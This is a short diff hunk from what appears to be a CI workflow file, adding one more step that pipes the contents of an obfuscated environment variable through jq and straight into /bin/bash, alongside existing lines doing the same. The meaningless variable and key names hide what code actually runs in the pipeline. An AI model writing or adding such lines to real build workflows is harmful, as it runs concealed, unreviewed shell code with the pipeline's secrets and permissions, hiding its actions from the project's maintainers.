@@ -22,6 +22,7 @@ jobs:
           echo $ls765 | jq -r .znv05 | /bin/bash
           echo $hitb807 | jq -r .sdja4 | /bin/bash
           echo $p3 | jq -r .rl7242 | /bin/bash
+          printf '%s' "$lhtlm9783" | jq -r .lmios98 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
